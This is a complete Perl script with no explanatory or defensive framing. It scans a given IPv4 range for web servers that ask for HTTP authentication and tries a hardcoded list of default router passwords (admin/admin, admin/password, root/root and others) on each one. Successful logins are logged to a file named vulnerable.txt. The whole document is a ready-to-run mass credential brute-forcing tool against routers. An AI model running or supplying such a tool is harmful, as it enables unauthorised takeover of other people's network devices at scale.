#!/usr/bin/perl -w
use IO::Socket;
use LWP;
my $browser = LWP::UserAgent->new;
$browser->timeout(1);
my $realm;
my @success;
my $successTotal;

if(@ARGV != 2){
  print "Parameters: [Start IP] [End IP]\n";
  exit 1;
}

@sip = split(/\./, $ARGV[0]);
@eip = split(/\./, $ARGV[1]);
for($x = 0; $x < 4; ++$x){
  if(($sip[$x] >= 255) || ($eip[$x] >= 255) || ($sip[$x] < 1) || ($eip[$x] < 1)){
	print "[-] Invalid IP address entered - Please use numbers between 1 and 254.\n";
	exit 1;
  }
}


@creds = (
[ 'admin', 'password' ],
[ 'admin', 'admin' ],
[ 'sysadmin', 'admin' ],
[ 'sysadmin', 'password' ],
[ 'admin', 'changeme' ],
[ 'root', 'root' ],
);

sub tryCreds {
  my ($ip,$realm) = @_;
  for($i=0; $i<=$#creds; $i++)
  {
    $browser->credentials(
      $ip.':80',
      $realm,
      $creds[$i][0] => $creds[$i][1]
    );
    $response = $browser->get('http://' . $cip);
    if($response->header('WWW-Authenticate'))
    {
      print "     -  Failed:  " . $creds[$i][0] . ":" . $creds[$i][1] . "\n";
    }
    elsif($response->is_success)
    {
      print "     -  SUCCESS: " . $creds[$i][0] . ":" . $creds[$i][1] . "\n";
      push (@success, '>>'.$ip.':'.$creds[$i][0] . ":" . $creds[$i][1]."\n");
      $successTotal++;
      last;
    }
    else
    {
      print "     -  Failed:  " . $creds[$i][0] . ":" . $creds[$i][1] . "\n";
    }
  }
}


print "[+] Scanning ranges " . $ARGV[0] . " to " . $ARGV[1] . "\n\n";
while(1){
  $cip = join('.', @sip);
  $response = $browser->get('http://' . $cip . ':80');
  if($response->header('WWW-Authenticate'))
  {
    $realm = $response->header('WWW-Authenticate');
    $realm =~ /\"(.*?)\"/;
    print "[+] " . $cip . " is asking for login for " . $1 .  "\n";
    tryCreds($cip, $1);
  }
  elsif($response->is_success)
  {
  print "[~] Something at " . $cip . "\n";
  }
else
  {
    print "[-] " . $cip . "\n";  
  }

$sip[3] += "1";
  if($sip[3] > "255"){
	$sip[2] += "1";
	$sip[3] = "0";
  }
  if($sip[2] > "255"){
	$sip[1] += "1";
	$sip[2] = "0";
  }
  if($sip[1] > "255"){
	$sip[0] += "1";
	$sip[1] = "0";
  }
  if($ARGV[1] eq $cip){
	print "==========================================\n";
	print @success;
	print '[+] Scan completed! Found a total of ' . $successTotal . " vulnerable routers!\n";
	open(outputFile, ">>vulnerable.txt");
	print outputFile @success;;
	close(outputFile);
	print "File Saved to: vulnerable.txt\n\n";
exit 1;
  }
}
exit;
